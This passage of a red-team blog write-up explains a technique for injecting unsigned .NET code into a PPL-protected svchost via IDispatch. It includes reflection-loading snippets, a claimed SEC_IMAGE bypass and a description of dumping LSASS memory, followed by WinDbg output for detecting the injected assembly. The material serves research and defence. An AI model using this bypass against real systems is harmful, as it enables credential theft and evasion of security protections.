</span></span><span class="highlight-line"><span class="highlight-line-content">    DotNetInterop::ExecuteMethod&lt;mscorlib::_AssemblyPtr&gt;(loadMethod, args);</span></span></code></pre></div><!--/$--><ul class="min-w-0 space-y-2 mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl page-api-block:ml-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">GetStaticMethod: Retrieves Assembly.Load via reflection using its name and parameter count.</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">ExecuteMethod: Invokes Load with the byte array, loading the .NET assembly into the process.</p></div></li></ul><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">While executing the exploit and using the  <strong class="font-bold">System.Reflection.Assembly.LoadFile  </strong>instead of <strong class="font-bold">System.Reflection.Assembly.Load</strong> method to load the .NET assembly into memory, I encountered the following error:</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_4b8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">_com_error::ErrorMessage returned 0x00000235b759bdc0 L"Unknown error 0x80131604"</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">This corresponds to the HRESULT error code 0x80131604, which indicates that an uncaught exception was thrown during the method invocation via Reflection. This error can be interpreted as a failure in executing the .NET method through Reflection.</p><h4 id="executing-the-malicious-code" class="text-base @xs:text-lg @lg:text-xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.5em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#executing-the-malicious-code"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_kf8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_kf8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Executing the Malicious Code</div></h4><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Once the assembly is loaded into memory, the final step is to execute the payload. Your exploit looks for the Main method in the injected assembly and invokes it via reflection:</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_4j8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">// Some code<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">mscorlib::_MethodInfoPtr mainMethod = DotNetInterop::GetStaticMethod(payloadType, L"Main", 0);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">DotNetInterop::ExecuteMethod&lt;mscorlib::_ObjectPtr&gt;(mainMethod, mainArgs);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content"></span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">At this point in the exploit, the malicious .NET payload is executed within the context of the svchost process. Since svchost runs with the PsProtectedSignerWindows-Light protection, this step grants the malicious code elevated access within the Windows environment. Specifically, it allows the code to interact with protected processes under the Windows signer type, which are typically off-limits for unprivileged or unsigned code.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">By successfully injecting unsigned .NET code into a Protected Process Light (PPL) with a Windows signer, we effectively gain the ability to access highly secured processes, such as LSASS, or even bypass protections implemented by AV/EDR systems.</p><h3 id="ppl-bypass" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#ppl-bypass"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_kp8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_kp8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug"><strong class="font-bold">PPL Bypass</strong></div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">In the exploit's scenario, the svchost process runs with the Windows signer type (0x51), and the LSASS process, which is a critical security process, runs with the Lsa signer type (0x41). Despite LSASS having a higher protection level, the Windows signer type still has sufficient permissions to access the LSASS process because Windows is a higher-level signer than Lsa.</p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/~gitbook/image?url=https%3A%2F%2F615064086-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MXlxki-LGPmhYCBAzg5%252Fuploads%252FHOw7e1NiwiEChza6O8EA%252Fimage.webp%3Falt%3Dmedia%26token%3D20aa48ba-7be8-4ec8-a5ad-ce81f22e1d0b&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=8832a3e5&amp;sv=2" width="1197" height="636"></div></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Now, we can proceed to dump the memory of the LSASS process using the elevated privileges granted by the svchost exploit. This can be done by accessing the LSASS process' memory region and reading or dumping its content:</p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/~gitbook/image?url=https%3A%2F%2F615064086-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MXlxki-LGPmhYCBAzg5%252Fuploads%252FGJ1W1Zq70PDhpn320gIT%252Fyes.png%3Falt%3Dmedia%26token%3D0b06950b-3f06-46df-99ff-59578862941d&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=7c290c77&amp;sv=2" width="1218" height="751"></div></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The PoC exploit expects two arguments:</p><ul class="min-w-0 space-y-2 mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl page-api-block:ml-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">DLL Path (): This should be the full file path to a .NET DLL that you want to load.</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Static Class Name (): This is the name of a static class within the DLL that contains a public static void Main() method.</p></div></li></ul><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Additionally, according to a blog by <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://www.elastic.co/security-labs/inside-microsofts-plan-to-kill-pplfault#loading-code-into-ppl-processes">Elastic Security Labs<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_j578qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_j578qav5ukqiv5ubsnpfivb_)"></rect></svg></a>, Microsoft defends Protected Process Light (PPL) by enforcing <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">SEC_IMAGE</code> checks when creating image sections. This ensures that the digital signature of any file used to create an image section is validated, and only signed code can be loaded into PPL processes. However, .NET Reflection, which allocates assemblies into memory directly, bypasses this mechanism because it doesn't create an image section or require file-backed validation. This is why Reflection-based loading can bypass SEC_IMAGE integrity checks and potentially load malicious code into a PPL process without triggering these defences.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Finally, the bypass occurs because .NET Reflection (specifically via <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">Assembly.Load(byte[])</code>) does not create an image section. Instead, it directly allocates memory for the assembly , bypassing the <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">SEC_IMAGE</code> integrity checks. These checks are typically enforced when an image section is created, as they validate the digital signature of the file backing the section (via <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">NtCreateSection</code> with <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">SEC_IMAGE</code>). Since the assembly is loaded directly into memory rather than being backed by a file, there is no file-backed section to validate, allowing the payload to bypass the code integrity checks enforced by SEC_IMAGE for PPL processes.</p><h2 id="light-memory-analysis-a-deep-dive" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#light-memory-analysis-a-deep-dive"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_lb8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_lb8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">Light Memory Analysis: A Deep Dive</div></h2><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">In this analysis, we walk through how to detect, trace, and analyse a malicious assembly loaded into a .NET process, using various Windows debugging tools like WinDbg and CLR Debugging Extensions. The following steps highlight how we can identify suspicious activity, locate that .NET unsigned code in memory, and investigate the underlying behaviour.</p><h3 id="dump-the-entire-appdomain" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://mohamed-fakroud.gitbook.io/red-teamings-dojo/abusing-idispatch-for-trapped-com-object-access-and-injecting-into-ppl-processes#dump-the-entire-appdomain"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_lf8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_lf8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Dump the Entire AppDomain</div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start"><strong class="font-bold">!dumpdomain </strong>command shows several AppDomains that are currently loaded on the PPL svchost process.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_5j8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">0:008&gt; !dumpdomain<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">--------------------------------------<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">System Domain:      00007ff86dd55250<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">LowFrequencyHeap:   00007ff86dd557c8<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">HighFrequencyHeap:  00007ff86dd55858<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">StubHeap:           00007ff86dd558e8<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Stage:              OPEN<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Name:               None<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">--------------------------------------<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Shared Domain:      00007ff86dd54c80<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">LowFrequencyHeap:   00007ff86dd557c8<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">HighFrequencyHeap:  00007ff86dd55858<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">StubHeap:           00007ff86dd558e8<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Stage:              OPEN<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Name:               None<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Assembly:           000001d900c177c0 [C:\Windows\Microsoft.Net\assembly\GAC_64\mscorlib\v4.0_4.0.0.0__b77a5c561934e089\mscorlib.dll]<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">ClassLoader:        000001d900c1f380<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  Module Name<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">00007ff868c21000            C:\Windows\Microsoft.Net\assembly\GAC_64\mscorlib\v4.0_4.0.0.0__b77a5c561934e089\mscorlib.dll<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">--------------------------------------<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Domain 1:           000001d900c57010<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">LowFrequencyHeap:   000001d900c57808<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">HighFrequencyHeap:  000001d900c57898<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">StubHeap:           000001d900c57928<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Stage:              OPEN<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">SecurityDescriptor: 000001d900ca29f0<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Name:               DefaultDomain<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Assembly:           000001d900c177c0 [C:\Windows\Microsoft.Net\assembly\GAC_64\mscorlib\v4.0_4.0.0.0__b77a5c561934e089\mscorlib.dll]<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">ClassLoader:        000001d900c1f380<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">SecurityDescriptor: 000001d900c1d150<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  Module Name<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">00007ff868c21000            C:\Windows\Microsoft.Net\assembly\GAC_64\mscorlib\v4.0_4.0.0.0__b77a5c561934e089\mscorlib.dll<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">Assembly:           000001d900c18580 [debug, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null]<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">ClassLoader:        000001d901bdb600<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">SecurityDescriptor: 000001d901be6470<!-- -->
